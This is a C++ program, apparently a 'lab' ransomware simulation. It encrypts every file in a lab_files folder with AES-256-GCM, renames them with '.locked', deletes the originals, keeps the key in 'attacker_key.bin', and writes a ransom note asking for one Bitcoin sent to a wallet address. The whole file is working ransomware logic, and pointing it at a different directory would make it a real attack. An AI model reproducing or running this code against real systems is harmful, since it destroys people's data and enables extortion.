#include <openssl/evp.h>
#include <openssl/rand.h>

#include <algorithm>
#include <array>
#include <cstdint>
#include <climits>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <iterator>
#include <string>
#include <vector>

namespace fs = std::filesystem;

constexpr std::size_t KEY_SIZE = 32;
constexpr std::size_t IV_SIZE = 12;
constexpr std::size_t TAG_SIZE = 16;

using Bytes = std::vector<unsigned char>;

bool read_file(const fs::path& path, Bytes& data) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return false;
    data.assign(std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>());
    return file.good() || file.eof();
}

bool write_file(const fs::path& path, const Bytes& data) {
    std::ofstream file(path, std::ios::binary | std::ios::trunc);
    if (!file) return false;
    if (!data.empty()) {
        file.write(reinterpret_cast<const char*>(data.data()), static_cast<std::streamsize>(data.size()));
    }
    file.flush();
    return file.good();
}

bool random_bytes(unsigned char* buffer, int size) {
    return RAND_bytes(buffer, size) == 1;
}

bool aes_encrypt(const Bytes& plaintext, const std::array<unsigned char, KEY_SIZE>& key,
    const std::array<unsigned char, IV_SIZE>& iv, Bytes& ciphertext, std::array<unsigned char, TAG_SIZE>& tag) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;
    bool ok = false;
    int len = 0, total = 0;
    ciphertext.resize(plaintext.size() + 16);

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) goto cleanup;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, static_cast<int>(iv.size()), nullptr) != 1) goto cleanup;
    if (EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), iv.data()) != 1) goto cleanup;

    if (!plaintext.empty()) {
        if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), static_cast<int>(plaintext.size())) != 1) goto cleanup;
        total = len;
    }
    if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + total, &len) != 1) goto cleanup;
    total += len;
    ciphertext.resize(total);

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, static_cast<int>(tag.size()), tag.data()) != 1) goto cleanup;
    ok = true;
cleanup:
    EVP_CIPHER_CTX_free(ctx);
    return ok;
}

bool aes_decrypt(const Bytes& ciphertext, const std::array<unsigned char, KEY_SIZE>& key,
    const std::array<unsigned char, IV_SIZE>& iv, const std::array<unsigned char, TAG_SIZE>& tag, Bytes& plaintext) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;
    bool ok = false;
    int len = 0, total = 0;
    plaintext.resize(ciphertext.size() + 16);

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) goto cleanup;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, static_cast<int>(iv.size()), nullptr) != 1) goto cleanup;
    if (EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), iv.data()) != 1) goto cleanup;

    if (!ciphertext.empty()) {
        if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext.data(), static_cast<int>(ciphertext.size())) != 1) goto cleanup;
        total = len;
    }
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, static_cast<int>(tag.size()), const_cast<unsigned char*>(tag.data())) != 1) goto cleanup;
    if (EVP_DecryptFinal_ex(ctx, plaintext.data() + total, &len) != 1) goto cleanup;

    total += len;
    plaintext.resize(total);
    ok = true;
cleanup:
    EVP_CIPHER_CTX_free(ctx);
    if (!ok) {
        std::fill(plaintext.begin(), plaintext.end(), 0);
        plaintext.clear();
    }
    return ok;
}

bool encrypt_sample(const fs::path& input, const fs::path& output, const std::array<unsigned char, KEY_SIZE>& key) {
    Bytes plain;
    if (!read_file(input, plain)) {
        std::cerr << "Cannot read: " << input << '\n';
        return false;
    }
    if (plain.size() > static_cast<std::size_t>(INT_MAX)) return false;

    std::array<unsigned char, IV_SIZE> iv{};
    std::array<unsigned char, TAG_SIZE> tag{};
    if (!random_bytes(iv.data(), static_cast<int>(iv.size()))) return false;

    Bytes ciphertext;
    if (!aes_encrypt(plain, key, iv, ciphertext, tag)) return false;

    Bytes blob = {'L', 'A', 'B', '1'};
    blob.insert(blob.end(), iv.begin(), iv.end());
    blob.insert(blob.end(), tag.begin(), tag.end());
    blob.insert(blob.end(), ciphertext.begin(), ciphertext.end());

    if (!write_file(output, blob)) return false;

    std::error_code ec;
    fs::remove(input, ec); 
    if (ec) {
        std::cerr << "Failed to delete original file: " << input << '\n';
        return false;
    }

    std::cout << "[ENCRYPTED & DELETED ORIGINAL] " << output << '\n';
    return true;
}

bool decrypt_sample(const fs::path& input, const fs::path& output, const std::array<unsigned char, KEY_SIZE>& key) {
    Bytes blob;
    if (!read_file(input, blob)) return false;

    constexpr std::size_t HEADER_SIZE = 4 + IV_SIZE + TAG_SIZE;
    if (blob.size() < HEADER_SIZE || !std::equal(blob.begin(), blob.begin() + 4, "LAB1")) return false;

    std::array<unsigned char, IV_SIZE> iv{};
    std::array<unsigned char, TAG_SIZE> tag{};
    std::copy_n(blob.begin() + 4, IV_SIZE, iv.begin());
    std::copy_n(blob.begin() + 4 + IV_SIZE, TAG_SIZE, tag.begin());

    Bytes ciphertext(blob.begin() + HEADER_SIZE, blob.end());
    Bytes plaintext;

    if (!aes_decrypt(ciphertext, key, iv, tag, plaintext)) return false;

    if (!write_file(output, plaintext)) return false;

    std::error_code ec;
    fs::remove(input, ec);

    std::cout << "[RECOVERED COPY] " << output << '\n';
    return true;
}

void save_key(const fs::path& path, const std::array<unsigned char, KEY_SIZE>& key) {
    std::ofstream file(path, std::ios::binary);
    file.write(reinterpret_cast<const char*>(key.data()), key.size());
}

bool load_key(const fs::path& path, std::array<unsigned char, KEY_SIZE>& key) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return false;
    file.read(reinterpret_cast<char*>(key.data()), key.size());
    return file.good();
}

int main(int argc, char* argv[]) {
    try {
        if (argc != 2 || (std::string(argv[1]) != "encrypt" && std::string(argv[1]) != "decrypt")) {
            std::cerr << "Usage: lab encrypt|decrypt\n";
            return 1;
        }

        const fs::path root = fs::current_path() / "lab_files";
        const fs::path key_file = fs::current_path() / "attacker_key.bin";

        if (!fs::exists(root) || !fs::is_directory(root)) {
            std::cerr << "Create lab_files folder first.\n";
            return 1;
        }

        std::array<unsigned char, KEY_SIZE> key{};

        if (std::string(argv[1]) == "decrypt") {
            if (!load_key(key_file, key)) {
                std::cerr << "Key not found. The attacker has the key.\n";
                return 1;
            }

            for (const auto& entry : fs::directory_iterator(root)) {
                if (entry.path().extension() == ".locked") {
                    fs::path output = entry.path();
                    output.replace_extension("");
                    decrypt_sample(entry.path(), output, key);
                }
            }
            std::fill(key.begin(), key.end(), 0);
            return 0;
        }

        if (!random_bytes(key.data(), static_cast<int>(key.size()))) return 1;
        save_key(key_file, key);

        std::vector<fs::path> samples;
        for (const auto& entry : fs::directory_iterator(root)) {
            if (!entry.is_regular_file()) continue;
            if (entry.path().extension() == ".locked") continue;
            samples.push_back(entry.path());
        }

        for (const auto& file : samples) {
            fs::path output = file;
            output += ".locked";
            
            fs::path temp_input = file;
            temp_input += ".tmp";
            fs::rename(file, temp_input);
            
            if (!encrypt_sample(temp_input, output, key)) {
                fs::rename(temp_input, file); 
            }
        }

        std::ofstream note(root / "README_RESTORE.txt");
        note << "========================================\n";
        note << "      YOUR FILES HAVE BEEN ENCRYPTED    \n";
        note << "========================================\n\n";
        note << "All your files are encrypted using Beta mini.\n";
        note << "To recover your files, send 1 Bitcoin to:\n";
        note << "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\n";
        note << "Once paid, we will provide the decryption tool.\n";
        note.close();

        std::fill(key.begin(), key.end(), 0);
        std::cout << "\n[RANSOMWARE SIMULATION COMPLETE]\n";
        std::cout << "Files are locked. Check README_RESTORE.txt\n";
        return 0;
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << '\n';
        return 1;
    }
}